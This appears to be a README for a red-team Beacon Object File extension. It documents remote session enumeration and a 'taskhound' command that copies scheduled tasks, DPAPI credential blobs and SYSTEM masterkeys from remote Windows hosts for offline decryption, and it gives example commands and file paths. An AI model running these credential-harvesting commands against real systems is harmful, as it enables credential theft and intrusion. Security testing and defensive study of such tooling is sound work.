# SAR-BOF

This extension enhances situational awareness by providing a set of remote Beacon Object File (BOF) commands. These commands allow the operator to gather detailed information about the target.

![](_img/01.png)


## quser

Query user sessions on a remote machine, providing session information.

```
quser [host]
```


## taskhound

Collect scheduled tasks from remote systems, with options to filter for domain accounts with stored credentials and save XML task definitions for offline analysis. Can also collect DPAPI credential blobs and masterkeys for offline decryption.

```
taskhound <target> [username] [password] [-save <directory>] [-unsaved-creds] [-grab-blobs]
```

**Parameters:**
- `target` (required): Remote system to collect from (IP or hostname)
- `username` (optional): Username for authentication
- `password` (optional): Password for authentication
- `-save <directory>` (optional): Directory to save XML task files locally
- `-unsaved-creds` (optional): Show tasks without stored credentials (interactive token only)
- `-grab-blobs` (optional): Also collect credential blobs and masterkeys (requires `-save` flag)

**Examples:**
```
# Basic usage with current user context
taskhound 192.168.1.100

# Using explicit credentials
taskhound DC01 -u domain\admin -p P@ssw0rd

# Save XML files locally for offline analysis
taskhound 192.168.1.100 -save C:\TaskOutput

# Show all domain tasks including those without stored credentials
taskhound 192.168.1.100 -unsaved-creds

# Combined: save files and show all tasks
taskhound DC01 -u domain\admin -p P@ssw0rd -save C:\Output -unsaved-creds

# Collect tasks + credential blobs and masterkeys for offline decryption
taskhound 192.168.1.100 -save C:\TaskOutput -grab-blobs

# Full collection with credentials
taskhound DC01 -u domain\admin -p P@ssw0rd -save C:\Output -grab-blobs
```

**DPAPI Collection:**

When the `-grab-blobs` flag is used along with `-save`, TaskHound will additionally collect:
- **Credential Blobs**: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\*`
- **SYSTEM Masterkeys**: `C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\*`

These files are saved to:
- `<save_dir>\<hostname>\credentials\*` (credential blobs)
- `<save_dir>\<hostname>\masterkeys\*` (masterkeys)

The collected DPAPI files can be used with offline decryption tools to extract stored credentials from scheduled tasks.

## Credits
* Quser-BOF - https://github.com/netero1010/Quser-BOF
* TaskHound - https://github.com/1r0BIT/TaskHound